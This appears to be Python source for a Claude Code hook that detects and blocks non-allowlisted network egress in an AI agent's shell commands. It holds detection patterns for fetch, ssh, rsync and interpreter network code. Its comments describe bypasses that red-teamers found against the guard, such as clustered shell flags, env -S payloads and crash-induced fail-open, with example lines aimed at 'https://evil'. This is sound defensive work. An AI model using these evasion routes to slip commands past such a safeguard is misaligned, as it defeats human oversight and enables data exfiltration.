# (so that token is not the wrapped command). Any wrapper not listed here (and
# every wrapper for its other options) simply has its option words skipped.
_WRAPPER_OPT_ARGS = {
    "sudo": {
        "-u",
        "-g",
        "-U",
        "-C",
        "-p",
        "-r",
        "-t",
        "-h",
        "--user",
        "--group",
        "--other-user",
        "--prompt",
        "--role",
        "--type",
        "--host",
        "--chdir",
        "--close-from",
    },
    "doas": {"-u", "-C"},
    "env": {
        "-u",
        "-C",
        "-S",
        "--unset",
        "--chdir",
        "--split-string",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    },
    "nice": {"-n", "--adjustment"},
    "ionice": {"-c", "-n", "-p", "-P", "--class", "--classdata", "--pid", "--pgid"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "xargs": {
        "-I",
        "-i",
        "-n",
        "-P",
        "-d",
        "-E",
        "-e",
        "-s",
        "-a",
        "-L",
        "-l",
        "--replace",
        "--max-args",
        "--max-procs",
        "--delimiter",
        "--max-lines",
        "--arg-file",
        "--eof",
        "--max-chars",
    },
    "caffeinate": {"-t", "-w"},
    "watch": {"-n", "--interval"},
    "flock": {"-w", "-E", "--timeout", "--conflict-exit-code"},
    "chrt": {"-p"},
    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
    "su": {"-s", "--shell", "-g", "--group", "--supp-group"},
}
# Wrappers that take a single POSITIONAL argument before the wrapped command
# (a duration for `timeout`, a lock path for `flock`).
_WRAPPER_POSITIONAL = {"timeout", "flock"}
_COMMAND_WRAPPERS = set(_WRAPPER_OPT_ARGS) | {
    "nohup",
    "command",
    "exec",
    "setsid",
    "script",
    "parallel",
    "unbuffer",
    "time",
}


# Builtins that run another command; `builtin <one of these> …` still runs it.
_BUILTIN_RUNNERS = frozenset({"command", "exec", "eval", "builtin"})


def _norm_head(token: str) -> str:
    """Normalise a candidate command-head token: drop surrounding quotes/leading
    backslash the mask may have kept, then any path prefix (`/usr/bin/curl`)."""
    token = token.strip().strip("\"'").lstrip("\\")
    return token.rsplit("/", 1)[-1].lower()


def _split_substitutions(text: str, placeholder: str = " "):
    """See _split_substitutions_scan. Memoised: the walkers in this module
    re-scan the same canonical forms many times per decision (nine calls on
    one 32 KB form, 2026-10-18 profile). Bodies come back as a fresh list."""
    outer, bodies = _split_substitutions_memo(text, placeholder)
    return outer, list(bodies)


@functools.lru_cache(maxsize=1024)
def _split_substitutions_memo(text: str, placeholder: str) -> tuple[str, tuple]:
    outer, bodies = _split_substitutions_scan(text, placeholder)
    return outer, tuple(bodies)


def _split_substitutions_scan(text: str, placeholder: str = " "):
    """Quote-aware segmenter. Returns (outer, [inner_command_strings]).

    Walks the string tracking single/double-quote state, and:
      * extracts the bodies of `$(...)` / backtick command substitutions and
        `<(...)` / `>(...)` process substitutions (each one executes) so they can
        be scanned as commands in their own right, leaving ``placeholder`` in
        their place (a space by default; the git walkers pass a token so an
        unquoted `-C $(pwd)` keeps its argument);
      * replaces UNQUOTED command separators (`;` `|` `&` newline) and UNQUOTED
        subshell parens `(` `)` with a newline, so `outer.split(chr(10))` yields
        one simple command per segment.
    Everything inside quotes is preserved verbatim — inside single quotes a
    `$(...)` is literal (`grep '$(curl x)' f` stays data), and a `|` inside a
    quoted grep pattern (`grep "curl\\|wget"`) is not a pipe. Bare parens inside
    a quoted argument (`python3 -c "print('curl')"`) are not subshells."""
    bodies: list[str] = []
    out: list[str] = []
    i = 0
    n = len(text)
    in_single = False
    in_double = False
    while i < n:
        ch = text[i]
        if ch == "\\" and i + 1 < n and not in_single:
            out.append(text[i : i + 2])
            i += 2
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            out.append(ch)
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            out.append(ch)
            i += 1
            continue
        if not in_single:
            if ch == "$" and i + 1 < n and text[i + 1] == "(":
                depth, j = 0, i + 1
                while j < n:
                    if text[j] == "(":
                        depth += 1
                    elif text[j] == ")":
                        depth -= 1
                        if depth == 0:
                            break
                    j += 1
                bodies.append(text[i + 2 : j])
                out.append(placeholder)
                i = j + 1
                continue
            if ch in "<>" and i + 1 < n and text[i + 1] == "(":
                depth, j = 0, i + 1
                while j < n:
                    if text[j] == "(":
                        depth += 1
                    elif text[j] == ")":
                        depth -= 1
                        if depth == 0:
                            break
                    j += 1
                bodies.append(text[i + 2 : j])
                out.append(placeholder)
                i = j + 1
                continue
            if ch == "`":
                j = text.find("`", i + 1)
                if j == -1:
                    j = n
                bodies.append(text[i + 1 : j])
                out.append(placeholder)
                i = j + 1
                continue
        if not in_single and not in_double and ch in "();|&\n":
            # Unquoted command separator / subshell delimiter -> segment break.
            #
            # An opening paren only starts a SUBSHELL in command position. Glued
            # to a word character it is a call: `print('curl')`,
            # `console.log('curl')`, `search('curl')`. Breaking there split the
            # line into `print` and `'curl'`, and the second segment's head was
            # a fetch verb — so a heredoc feeding Python or Node
            # (`python3 - <<'EOF' … print('curl') … EOF`) was read as an
            # invocation and hard blocked (2026-09-05 challenger, round 2).
            # `)` stays a break unconditionally: an extra break can only split a
            # segment further, and `f() { curl x; }` still has `curl` at the
            # head of its own segment.
            if ch == "(" and i > 0 and _WORD_CHAR_RE.match(text[i - 1]):
                out.append(ch)
                i += 1
                continue
            out.append("\n")
            i += 1
            continue
        out.append(ch)
        i += 1
    return "".join(out), bodies


@functools.lru_cache(maxsize=8192)
def _shlex_tokens(segment: str) -> tuple[str, ...]:
    """shlex.split(segment) (POSIX, no comments), or a whitespace split when
    shlex rejects it. Memoised: pure in its input, and the egress walkers
    tokenised the same segment once per walker — about 15 000 shlex calls
    for one 32 KB `fly ssh console; …` command (2026-10-18 profile, 0.28 s of
    0.49 s)."""
    try:
        return tuple(shlex.split(segment, comments=False, posix=True))
    except ValueError:
        return tuple(segment.split())


@functools.lru_cache(maxsize=1024)
def _command_segment_tokens(text: str, placeholder: str) -> tuple[tuple, ...]:
    outer, _bodies = _split_substitutions(text, placeholder)
    segments = []
    for segment in outer.split("\n"):
        segment = segment.strip()
        if not segment:
            continue
        tokens = _shlex_tokens(segment)
        if tokens:
            segments.append(tokens)
    return tuple(segments)


def _iter_command_segments(text: str, placeholder: str = " "):
    """Yield token lists for each simple command in ``text`` (quote-aware).
    Segments come from _split_substitutions; each is tokenised with shlex so a
    quoted argument stays one token. Each list is a fresh copy of the
    memoised tokens, so a caller may slice or mutate it."""
    for tokens in _command_segment_tokens(text, placeholder):
        yield list(tokens)


def _consume_wrapper(tokens: list[str], start: int, wrapper: str) -> list[str]:
    """Skip a wrapper's option words (and any argument they consume) plus a
    single positional for timeout/flock, returning the tokens of the wrapped
    command."""
    return tokens[_wrapper_end(tokens, start, wrapper) :]


def _wrapper_end(tokens: list[str], start: int, wrapper: str) -> int:
    """Index of the wrapped command's first token — _consume_wrapper without
    the copy, for the loops that strip one wrapper after another."""
    optargs = _WRAPPER_OPT_ARGS.get(wrapper, set())
    positional_pending = wrapper in _WRAPPER_POSITIONAL
    j = start
    while j < len(tokens):
        tok = tokens[j]
        if tok == "--":
            j += 1
            break
        if wrapper == "env" and _ASSIGNMENT_RE.match(tok):
            j += 1
            continue
        if tok.startswith("-") and tok != "-":
            if tok in optargs and j + 1 < len(tokens):
                j += 2
            else:
                j += 1
            continue
        if positional_pending:
            if wrapper == "timeout" and not _DURATION_RE.match(tok):
                break
            positional_pending = False
            j += 1
            continue
        break
    return j


def _first_operand(tokens: list[str], start: int) -> int | None:
    """Index of the first non-flag token at or after ``start``, or None.

    `--` and any further `-…` option words are skipped. A token containing
    whitespace is treated as an operand however it starts: a shell's `-c`
    argument is code, and code may legitimately begin with `-`.
    """
    k = start
    while k < len(tokens):
        tok = tokens[k]
        if tok == "--":
            k += 1
            continue
        if tok.startswith("-") and tok != "-" and not any(c.isspace() for c in tok):
            k += 1
            continue
        return k
    return None


def _segment_invokes_fetch(
    tokens: list[str], depth: int, verbs: frozenset[str] = _FETCH_VERBS
) -> bool:
    """Whether the simple command described by ``tokens`` invokes curl/wget.

    A wrapper (`sudo`, `nohup`, `env`, `command`, …) is stripped IN A LOOP and
    the wrapped command re-examined from the top, never by a self-call: the
    self-call kept the same ``depth``, so ``_fetch_verb_invoked``'s depth bound
    never tripped and `"sudo -u r " * 1000 + "curl URL"` (10 KB, under the
    input cap) raised RecursionError. main() turned that into exit 1 — a
    NON-blocking hook failure — and the fetch ran (2026-09-25)."""
    start = 0
    # The `env -S` payload scan reads the WHOLE remaining tail. Each later
    # wrapper's tail is a suffix of the first one scanned, so a second scan can
    # only repeat a miss; skipping it keeps a long wrapper chain linear.
    env_tail_scanned = False
    while True:
        i = start
        while i < len(tokens):
            tok = tokens[i]
            if (
                _REDIRECTION_RE.match(tok)
                or _ASSIGNMENT_RE.match(tok)
                or tok in _CONTROL_WORDS
                or tok in (";", "&", "|")
            ):
                i += 1
                continue
            break
        if i >= len(tokens):
            return False
        head = _norm_head(tokens[i])
        if head in verbs:
            return True
        if head in _SHELL_INTERPRETERS or head == "su":
            # The command lives in a -c STRING or a <<< here-string, not in a
            # following token — recurse into that string.
            #
            # `-c` is rarely alone: `bash -lc`, `sh -ec`, `bash -xc`, `sh -euc`
            # and `zsh -lc` are the ordinary spellings, and a shell parses any
            # single-dash cluster of short flags, so `c` ANYWHERE in the
            # cluster means the next token is the command string. Matching the
            # literal `-c` alone let every clustered form through (2026-09-05
            # challenger).
            j = i + 1
            saw_command_flag = False
            while j < len(tokens):
                tok = tokens[j]
                is_c = tok in ("--command", "<<<") or (
                    _SHORT_FLAG_CLUSTER_RE.fullmatch(tok) and "c" in tok
                )
                if is_c:
                    # The command string is the first following NON-flag
                    # operand, not simply the next token: `bash -c -e 'curl …'`,
                    # `bash -c -- 'curl …'` and `bash -c -eu 'wget …'` all
                    # execute the quoted string, and taking tokens[j+1] blindly
                    # read `-e` / `--` as the code and missed the fetch
                    # (2026-09-05 challenger, round 2 — 5 of 17 forms). A token
                    # holding a SPACE is never a flag cluster, so
                    # `bash -c '-x; curl y'` is still the string.
                    k = _first_operand(tokens, j + 1)
                    if k is None:
                        j += 1
                        continue
                    saw_command_flag = True
                    if _fetch_verb_invoked(tokens[k], depth + 1, verbs):
                        return True
                    # Tokens after the command string are its positional
                    # parameters ($0, $1, …), not commands: `bash -c 'echo hi'
                    # curl` runs echo.
                    j = k + 1
                    continue
                j += 1
            if saw_command_flag:
                return False
            # No command flag at all: the shell may still be running something
            # from a non-flag operand (`bash script.sh`, `su root -- curl …`).
            # Fail closed and look inside every remaining non-flag token.
            for tok in tokens[i + 1 :]:
                if tok.startswith("-"):
                    continue
                if _fetch_verb_invoked(tok, depth + 1, verbs):
                    return True
            return False
        if head == "eval":
            return _fetch_verb_invoked(" ".join(tokens[i + 1 :]), depth + 1, verbs)
        if head == "find":
            for j in range(i + 1, len(tokens) - 1):
                if (
                    tokens[j] in ("-exec", "-execdir")
                    and _norm_head(tokens[j + 1]) in verbs
                ):
                    return True
            return False
        if head == "builtin":
            # `builtin command curl URL`, `builtin exec curl URL` and
            # `builtin eval 'curl URL'` run the named builtin, which runs the
            # fetch (2026-09-25 challenger on #650). Only a builtin that itself
            # runs a command is stripped; `builtin cd` / `builtin echo` keep
            # the verdict they had. `start` strictly advances, so a chain of
            # `builtin builtin …` stays linear. bash's `builtin` skips ONE
            # leading `--` before the builtin's name, so `builtin -- exec curl
            # URL` runs curl too (2026-09-26 challenger on #660).
            j = i + 1
            if j < len(tokens) and tokens[j] == "--":
                j += 1
            if j < len(tokens) and _norm_head(tokens[j]) in _BUILTIN_RUNNERS:
                start = j
                continue
            return False
        if head == "command":
            # `command -v curl` is a lookup, not an invocation — but only
            # `command`'s OWN option words (before the command name) count.
            # Scanning the whole tail read curl's `-v` (verbose) as the lookup
            # flag, so `command curl -v https://evil` was allowed (2026-09-25
            # challenger). Short options only, clusters included (`-pv`).
            j = i + 1
            while j < len(tokens):
                opt = tokens[j]
                if opt == "--" or not opt.startswith("-") or opt == "-":
                    break
                if not opt.startswith("--") and ("v" in opt or "V" in opt):
                    return False
                j += 1
            # `command` has its own options (`-p` uses a default PATH). Taking
            # the raw tail made `-p` the head token, so `command -p curl URL`
            # read as "a command named -p" and passed (2026-09-05 challenger).
            start = _wrapper_end(tokens, i + 1, head)
            continue
        if head == "env" and not env_tail_scanned:
            # `env -S "curl URL"` / `env --split-string='curl URL'` splits the
            # STRING into a command and runs it — the string is code, not an
            # option value to skip past. _consume_wrapper treats
            # -S/--split-string like any argument-taking option and stepped
            # straight over the payload (2026-09-05 challenger).
            env_tail_scanned = True
            for j in range(i + 1, len(tokens)):
                tok = tokens[j]
                payload: str | None = None
                if tok in ("-S", "--split-string") and j + 1 < len(tokens):
                    payload = tokens[j + 1]
                elif tok.startswith("--split-string="):
                    payload = tok.split("=", 1)[1]
                elif tok.startswith("-S") and len(tok) > 2:
                    payload = tok[2:]
                if payload and _fetch_verb_invoked(payload, depth + 1, verbs):
                    return True
            # fall through to the generic wrapper handling below
        if head in _COMMAND_WRAPPERS:
            # The wrapper token is always dropped (_wrapper_end(…, i + 1, …)
            # > i), so ``start`` strictly advances and the loop terminates.
            start = _wrapper_end(tokens, i + 1, head)
            if start >= len(tokens):
                return False
            continue
        return False


def _fetch_verb_invoked(
    text: str, depth: int = 0, verbs: frozenset[str] = _FETCH_VERBS
) -> bool:
    """Whether curl/wget is invoked anywhere in ``text`` (across substitutions,
    subshells, wrappers, shell -c strings, eval and find -exec)."""
    if not text:
        return False
    _check_nesting(depth)
    # Also scan the variable-resolved form, so `x=curl; $x https://evil` and the
    # same inside a recursed `sh -c` string resolve to a real invocation.
    candidates = [text]
    resolved = _resolve_vars(text)
    if resolved != text:
        candidates.append(resolved)
    for candidate in candidates:
        _outer, bodies = _split_substitutions(candidate)
        for body in bodies:
            if _fetch_verb_invoked(body, depth + 1, verbs):
                return True
        for seg_tokens in _iter_command_segments(candidate):
            if _segment_invokes_fetch(seg_tokens, depth, verbs):
                return True
    return False


def _git_network_subcommand_invoked(text: str) -> bool:
    """Whether some simple command in ``text`` runs git with a subcommand that
    reaches the network, after any global options. Token-level over the RAW
    text: the structural mask drops a quoted multi-word argument, so in the
    masked form of `git -C "/tmp/a b" clone https://x` the `-C` has lost its
    argument and swallows `clone` instead — the regex over the masked form
    (which still covers `sh -c '…'` strings) cannot see that one."""
    for git in _git_invocations(text):
        j, _selectors = _git_global_options(git)
        if j >= len(git):
            continue
        if git[j] in _GIT_EGRESS_SUBCOMMANDS:
            return True
        if (
            git[j] == "remote"
            and j + 1 < len(git)
            and git[j + 1] in _GIT_EGRESS_REMOTE_VERBS
        ):
            return True
    return False


# =============================================================================
# rsync remotes and perl/ruby/php network one-liners, read without modelling
# the shell (2026-11-01). The rsync pattern above needs `::` or `user@host:`,
# so `rsync -a out host:/tmp` and `rsync://host/mod` ran; the perl pattern
# needs `-e` right after perl, so `perl -MLWP::Simple -e ...` ran; ruby and
# php had no rule. Both rules below delete quotes and backslashes, split on
# whitespace and shell operators, and look at words: a command word plus a
# remote word anywhere in the command is egress. Nothing tracks quoting,
# segments or nesting, which is what produced one bypass per review round in
# the chmod rule. The cost is a few false positives, for example `rsync -a a
# b; date +%H:%M`, which ask (interactive) or block (worker) like any egress.
# =============================================================================
_WORD_DELETE = str.maketrans("", "", "'\"\\`")
_WORD_SPLIT = re.compile(r"[\s;&|()<>]+")
_INTERPRETER_NAME_RE = re.compile(
    r"(?:perl|ruby|php|irb|erb|jruby|truffleruby|mruby|pry|rake|rails)"
    r"(?:\d+(?:\.\d+)*)?|php-(?:cgi|cli)(?:\d+(?:\.\d+)*)?"
)
_INTERPRETERS = (
    "perl",
    "ruby",
    "php",
    "irb",
    "erb",
    "jruby",
    "truffleruby",
    "mruby",
    "pry",
    "rake",
    "rails",
    "php-cgi",
    "php-cli",
)
_RSYNC_NAMES = ("rsync", "openrsync")
# Split points of a plain command. A pipeline stays one segment: a pipe
# can feed rsync its arguments (`echo host:x | xargs rsync`), and `|&` is
# a pipe too.
_PLAIN_SEGMENT_SPLIT = re.compile(r"&&|\|\||;|\n|(?<!\|)&")

# Signs of network use in perl/ruby/php code, matched case-insensitively.
# Inline code in these languages can do anything, so no text rule sees it
# all: a mode, URL or API name built at run time (base64, urldecode, string
# joins, const_get on a computed name) is a known limit, and the real
# boundary for interpreters is an OS-level network sandbox. These rules
# catch code written out in the command.
#
# A URL is judged by its host like any other egress, so `git clone
# https://github.com/... && ruby -v` passes with github.com allowlisted.
_INTERPRETER_URL_RE = re.compile(
    r"://|\b(?:https?|ftps?|tcp|udp|ssl|tls):/", re.IGNORECASE
)
# Every other sign names no host the guard can trust (`TCPSocket.new(h,
# 80)`), so the command is unresolved and an allowlisted URL elsewhere in it
# never lets it pass. Matched per word, skipping source-file names, so
# `ruby -Itest test/socket_test.rb` is not network code.
_INTERPRETER_CODE_RE = re.compile(
    r"socket|connect\s*\(|\.connect\b|gethostby|getaddrinfo|addrinfo"
    r"|dns_get_record|checkdnsrr|getmxrr|resolv\b|net::|lwp|http::|open-uri"
    r"|uri\.open|faraday|httparty|excon|furl|curl_|fsockopen|soapclient"
    r"|syscall|mysqli|\bpdo\b|host=|memcache|imap_|snmp|mysql2|mojo"
    r"|const_get",
    re.IGNORECASE,
)
# A module path inside code (`require "net/http"`) has a slash, so it is
# matched on the whole text, not per word.
_INTERPRETER_MODULE_PATH_RE = re.compile(
    r"\bnet/(?:https?|ftp|smtp|pop|imap|telnet)\b", re.IGNORECASE
)
_SOURCE_FILE_SUFFIXES = (
    ".rb",
    ".rake",
    ".erb",
    ".php",
    ".phpt",
    ".pl",
    ".pm",
    ".t",
    ".py",
)
# String escapes the interpreter decodes when it reads the code: `\x3a`,
# `\72`, `\u{3a}`, `\x{3a}`, `\o{72}` and `\N{U+3A}` are a written-out
# colon, not one built at run time. PHP and ruby take one to three octal
# digits; ruby's `\u{3a 2f 2f}` holds several code points.
_ESCAPE_RE = re.compile(
    r"\\x\{([0-9a-fA-F]{1,6})\}|\\o\{([0-7]{1,8})\}|\\N\{U\+([0-9a-fA-F]{1,6})\}"
    r"|\\u\{([0-9a-fA-F ]{1,40})\}|\\u([0-9a-fA-F]{4})|\\x([0-9a-fA-F]{1,2})"
    r"|\\([0-7]{1,3})"
)


def _chr(code: int) -> str:
    return chr(code) if code < 0x110000 else ""


def _decode_escapes(text: str) -> str:
    def one(m: re.Match) -> str:
        xbrace, obrace, named, ubrace, u4, x2, octal = m.groups()
        if ubrace is not None:
            return "".join(_chr(int(h, 16)) for h in ubrace.split() if h)
        if obrace is not None or octal is not None:
            return _chr(int(obrace or octal, 8))
        return _chr(int(xbrace or named or u4 or x2, 16))

    return _ESCAPE_RE.sub(one, text)


def _words(form: str) -> list[str]:
    return [w for w in _WORD_SPLIT.split(form.translate(_WORD_DELETE)) if w]


def _word_names(word: str, names: tuple[str, ...]) -> bool:
    """Whether ``word`` runs one of ``names``: its basename, lowercased (the
    macOS file system ignores case), or a glob that matches one."""
    base = word.rsplit("/", 1)[-1].lower()
    if any(c in base for c in "*?["):
        return any(fnmatch.fnmatchcase(n, base) for n in names)
    return base in names


def _is_rsync_remote(word: str) -> bool:
    """rsync's own rule: a colon before any slash makes a path remote
    (`host:path`, `user@host:path`, `host::module`, `rsync://host/...`)."""
    if word.startswith("-"):
        # `--files-from=host:list` and the like name a remote in the value.
        if "=" not in word:
            return False
        word = word.split("=", 1)[1]
    colon = word.find(":")
    return colon > 0 and "/" not in word[:colon]


def _rsync_remote_words(forms: list[str]) -> list[str]:
    """The remote words of every rsync use in ``forms``."""
    found: list[str] = []
    for form in forms:
        flat = form.translate(_WORD_DELETE).lower()
        if "rsync" not in flat and not any(c in flat for c in "*?["):
            continue
        # A plain command (no quoting, escapes or expansions) splits safely
        # on ; && || & and newlines (never inside a pipeline), so a colon
        # word must sit in rsync's own segment: `rsync -a dist/ b/ && npm run
        # build:prod` is local. With any of those characters, or a
        # redirection (`2>&1` holds an &), a split could be wrong (`\;` is an
        # argument), so the whole command counts.
        if any(c in form for c in "'\"\\`$<>") or _ARGUMENT_FEEDER_RE.search(flat):
            segments = [form]
        else:
            segments = _PLAIN_SEGMENT_SPLIT.split(form)
        for segment in segments:
            words = _words(segment)
            if any(_word_names(w, _RSYNC_NAMES) for w in words):
                found.extend(w for w in words if _is_rsync_remote(w))
                if _rsync_ssh_hop(words):
                    found.append(_RSYNC_UNREADABLE)
    return found


# A sentinel remote word: its host cannot be read, so the command is
# unresolved.
_RSYNC_UNREADABLE = "?:"


def _rsync_ssh_hop(words: list[str]) -> bool:
    """rsync's remote shell is ssh with a jump or proxy (`-e 'ssh -J h'`,
    `-o ProxyJump=h`): ssh connects to that host first, and no remote word
    names it (final review)."""
    # "ssh" anywhere in a word: `-essh` (glued), `--rsh=ssh`, autossh.
    if not any("ssh" in w.lower() for w in words):
        return False
    # Short flags can be grouped behind one dash (`-qJ host`, `-4oProxyJump=h`),
    # so any single-dash word holding J, o or F counts.
    return any(
        (w.startswith("-") and not w.startswith("--") and any(c in w for c in "JoF"))
        or "proxy" in w.lower()
        for w in words
    )


def _rsync_remote_invoked(forms: list[str]) -> bool:
    return bool(_rsync_remote_words(forms))


_RSYNC_HOST_RE = re.compile(r"[A-Za-z0-9_.:-]+")
# Programs that turn earlier output into rsync's arguments, across a file or
# a split point (`... | tee f; cat f | xargs rsync`).
_ARGUMENT_FEEDER_RE = re.compile(r"\b(?:xargs|parallel)\b")


def _rsync_remote_hosts(forms: list[str]) -> set[str] | None:
    """Hosts of the rsync remotes, or None when one cannot be read. The
    general host extraction only looks after the word rsync, so a remote fed
    in from earlier in a pipeline (`echo host:x | xargs rsync`) was judged by
    other hosts in the command alone (final review)."""
    hosts: set[str] = set()
    for word in _rsync_remote_words(forms):
        if word.startswith("-"):
            word = word.split("=", 1)[1]
        if word.lower().startswith("rsync://"):
            try:
                host = urlsplit(word).hostname
            except ValueError:
                return None
        else:
            spec = word[: word.find("::") if "::" in word else word.find(":")]
            if spec.startswith("["):
                spec = word[1 : word.find("]")] if "]" in word else ""
            host = spec.rsplit("@", 1)[-1]
        if not host or not _RSYNC_HOST_RE.fullmatch(host):
            return None
        hosts.add(host.lower())
    return hosts


def _is_path_word(word: str) -> bool:
    """A source file named as an argument (`test/socket_test.rb`). Only the
    suffix counts: a slash alone is division in code, so `1/TCPSocket.new`
    must still be read (challenger round 3)."""
    if word.startswith("-") or "::" in word or "->" in word:
        return False
    return word.lower().endswith(_SOURCE_FILE_SUFFIXES)


def _interpreter_network_code(forms: list[str]) -> str | None:
    """ "code" when perl/ruby/php network code names no trustworthy host,
    "url" when the only sign is a URL (judged by its host), else None."""
    found: str | None = None
    for form in forms:
        decoded = _decode_escapes(form)
        flat = decoded.translate(_WORD_DELETE)
        url = _INTERPRETER_URL_RE.search(flat)
        module = _INTERPRETER_MODULE_PATH_RE.search(flat)
        if not url and not module and not _INTERPRETER_CODE_RE.search(flat):
            continue
        words = _words(decoded)
        if not any(
            _INTERPRETER_NAME_RE.fullmatch(w.rsplit("/", 1)[-1].lower())
            or (any(c in w for c in "*?[") and _word_names(w, _INTERPRETERS))
            for w in words
        ):
            continue
        if module or any(
            not _is_path_word(w) and _INTERPRETER_CODE_RE.search(w) for w in words
        ):
            return "code"
        if url and decoded != form:
            # Escapes were decoded: the host check reads the command as
            # written and may never see the decoded URL, so nothing resolves.
            return "code"
        if url:
            found = "url"
    return found


def is_network_egress(command: str) -> bool:
    raw_forms = _canonical_forms(command)
    if _rsync_remote_invoked(raw_forms) or _interpreter_network_code(raw_forms):
        return True
    masked_forms = [m for m in (_structural_mask(f) for f in raw_forms) if m]
    for form in masked_forms:
        if _has_db_client_case_sensitive_flag(form):
            return True
    for form in raw_forms:
        if _git_network_subcommand_invoked(form):
            return True

    # Bare fetch verb: an INVOCATION, not merely the word. Scanned over the
    # masked forms (which drop quoted data arguments AND collapse a heredoc
    # BODY fed to a non-shell command to one line, so `cat > f <<EOF\ncurl\nEOF`
    # is not read as an invocation while `sh <<EOF\ncurl\nEOF` still is). A
    # command substitution that is the sole content of a double-quoted argument
    # is dropped by the mask, so those bodies are scanned from the raw forms too
    # (quote-aware: single-quoted `$(...)` stays literal).
    #
    # The same walk also looks for ssh/scp/sftp HEADS (one pass, both verb
    # sets): `s\sh host` and `s''sh host` run ssh, but no form spells the word
    # for the ssh pattern below to match (2026-10-17).
    for form in masked_forms:
        if _fetch_verb_invoked(form, verbs=_EGRESS_HEAD_VERBS):
            return True
    for form in raw_forms:
        _, bodies = _split_substitutions(form)
        for body in bodies:
            if _fetch_verb_invoked(body, verbs=_EGRESS_HEAD_VERBS):
                return True

    for pattern in NETWORK_EGRESS_PATTERNS:
        if pattern == _BARE_FETCH_PATTERN:
            continue  # handled by the invocation scan above
        for form in masked_forms:
            if re.search(pattern, form, re.IGNORECASE):
                return True
    return False


def check_command(
    command: str,
    allowlist: list[str] | None = None,
    *,
    unattended: bool | None = None,
    permission_mode: str | None = None,
):
    """Check a Bash command for non-allowlisted network egress.

    Returns (result_dict, hosts) when the command must not run unreviewed,
    or None if it's safe (not egress, fully allowlisted, or gate passed).
    The dict is a hard block (`{"decision": "block", ...}`, exit code 2) in
    an unattended worker, and an approval prompt
    (`{"hookSpecificOutput": {"permissionDecision": "ask", ...}}`, exit 0)
    in an interactive session whose ``permission_mode`` can show one
    (prompts_possible). ``unattended`` None means detect from the
    environment (is_unattended_context).
    """
    size = len(command.encode("utf-8", "surrogatepass"))
    cap = get_max_command_length()
    if size > cap:
        reason = (
            f"Command exceeds maximum analyzable size: {size} bytes > "
            f"{cap}-byte cap (security.max_command_length)."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, set()

    # extract_hosts canonicalizes too, so it is inside the same guard: an
    # _AnalysisTooComplex escaping here would reach main()'s bare `except
    # Exception` and exit 1, which Claude Code treats as a non-blocking hook
    # failure — the fail-open these bounds exist to prevent.
    try:
        egress = is_network_egress(command)
        if not egress:
            return None
        base, extra = _classified_hosts(command)
    except _AnalysisTooComplex as exc:
        reason = f"Command too complex to analyze safely: {exc}."
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, set()
    except (Exception, _AnalysisDeadline) as exc:  # noqa: BLE001 - fail CLOSED
        # Any other failure while analysing the command text (RecursionError,
        # a regex error on a crafted value — the #598 `x=a\dc` class) would
        # otherwise reach main()'s generic handler and exit 1, which Claude
        # Code treats as a non-blocking hook failure: the command would run.
        reason = (
            f"Command analysis failed ({type(exc).__name__}); blocked rather "
            f"than allowed unanalyzed."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, set()

    # Inline perl/ruby/php network code names no host the guard can trust;
    try:
        forms = _canonical_forms(command)
        if _interpreter_network_code(forms) == "code":
            extra = None
        # rsync remotes can only add hosts that must pass, never resolve.
        rsync_hosts = _rsync_remote_hosts(forms)
        if rsync_hosts is None:
            extra = None
        elif extra is not None:
            extra = extra | rsync_hosts
    except (Exception, _AnalysisDeadline) as exc:  # noqa: BLE001 - fail CLOSED
        reason = (
            f"Command analysis failed ({type(exc).__name__}); blocked rather "
            f"than allowed unanalyzed."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, set()

    # Unreadable ssh-family destination: the whole command is unresolved.
    hosts = set() if extra is None else base | extra

    try:
        active_allowlist = allowlist if allowlist is not None else get_allowlist()
    except Exception as exc:  # noqa: BLE001 - fail CLOSED
        # A malformed `security` section raised here, main() exited 1, and
        # Claude Code — treating exit 1 as a non-blocking hook failure — ran
        # the command (2026-10-17 challenger).
        reason = (
            f"Network allowlist could not be loaded ({type(exc).__name__}: "
            f"{exc}); blocked rather than judged against an unknown list. Fix "
            f"gatesmith.json security.network_allowlist (a list of host "
            f"strings)."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts

    # `base and …` — an empty BASE (nothing origin/main's reading resolved)
    # must NOT be treated as allowed; `all()` on an empty iterable is True.
    # EXTRA hosts must pass too, but they never stand in for BASE — see
    # _classified_hosts.
    if (
        extra is not None
        and base
        and all(_host_allowed(h, active_allowlist) for h in base | extra)
    ):
        return None

    if is_gate_passed():
        return None

    # Name only the hosts that FAILED the allowlist: listing every host made a
    # compound command read as though its allowlisted hosts were refused too
    # (a `git fetch` + relay curl line printed "github.com, relay3…").
    blocked = sorted(h for h in hosts if not _host_allowed(h, active_allowlist))
    destination = ", ".join(blocked) if blocked else "(destination unresolved)"
    if allowlist is None:
        destination += f" [{_allowlist_source()}]"
    if unattended is None:
        unattended = is_unattended_context()
    if unattended:
        reason = (
            f"Outbound network egress to non-allowlisted destination: {destination}. "
            f"Unattended worker — hard block. Add the host to gatesmith.json "
            f"security.network_allowlist if it's a legitimate recurring need."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
    if not prompts_possible(permission_mode):
        mode = permission_mode or "unknown"
        reason = (
            f"Outbound network egress to non-allowlisted destination: {destination}. "
            f"This session's permission mode ({mode}) cannot show an approval "
            f"prompt, so the command is blocked. To approve: run /gate (opens a "
            f"4h window), add the host to gatesmith.json "
            f"security.network_allowlist, or switch the session to default "
            f"permission mode to get an inline prompt."
        )
        return {"decision": "block", "reason": f"BLOCKED: {reason}"}, hosts
    reason = (
        f"Outbound network egress to non-allowlisted destination: {destination}. "
        f"Approve to run this one command; for a recurring need add the host to "
        f"gatesmith.json security.network_allowlist (or /gate opens a 4h window)."
    )
    return {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
        }
    }, hosts


# =============================================================================
# Presentation + entrypoint
# =============================================================================
def truncate_command(command: str, max_length: int = 60) -> str:
    if len(command) <= max_length:
        return command
    return command[: max_length - 3] + "..."


